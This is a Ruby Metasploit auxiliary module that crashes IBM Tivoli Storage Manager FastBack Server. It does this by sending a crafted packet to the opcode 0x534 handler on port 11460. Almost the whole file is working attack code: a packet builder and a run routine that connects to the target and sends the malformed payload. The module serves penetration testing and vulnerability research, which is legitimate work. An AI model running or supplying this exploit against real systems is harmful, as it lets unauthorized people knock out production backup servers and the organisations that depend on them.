##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info={})
    super(update_info(info,
      'Name'           => "IBM Tivoli Storage Manager FastBack Server Opcode 0x534 Denial of Service",
      'Description'    => %q{
          This module exploits a denial of service condition present in IBM Tivoli Storage Manager
          FastBack Server when dealing with packets triggering the opcode 0x534 handler.
        },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Gianni Gnesa',                              # Public disclosure/Proof of Concept
          'William Webb <william_webb[at]rapid7.com>', # Metasploit
        ],
      'References'     =>
        [
          ['EDB', '38979'],
          ['OSVDB', '132307']
        ],
      'DisclosureDate' => "Dec 15 2015",
    ))

    register_options(
      [
        Opt::RPORT(11460)
      ])
  end

  def tv_pkt(opcode, p1="", p2="", p3="")
    buf = Rex::Text.rand_text_alpha(0x0C)
    buf += [opcode].pack("V")
    buf += [0x00].pack("V")
    buf += [p1.length].pack("V")
    buf += [p1.length].pack("V")
    buf += [p2.length].pack("V")
    buf += [p1.length + p2.length].pack("V")
    buf += [p3.length].pack("V")

    buf += Rex::Text.rand_text_alpha(0x08)

    buf += p1
    buf += p2
    buf += p3

    pkt = [buf.length].pack("N")
    pkt << buf

    return pkt
  end

  def run
    target_opcode = 0x534
    connect
    print_status("Connected to: #{rhost} port: #{rport}")
    print_status("Sending malicious packet")

    p = tv_pkt(target_opcode,
               "File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % [Rex::Text.rand_text_alpha(0x200),0,0,0,0],
               Rex::Text.rand_text_alpha(0x60),
               Rex::Text.rand_text_alpha(0x60)
              )

    sock.put(p)
    print_status("Packet sent!")
  rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => ex
    print_error("Exploit failed: #{ex.class} #{ex.message}")
    elog("#{ex.class} #{ex.message}\n#{ex.backtrace * "\n"}")
  ensure
    disconnect
  end
end
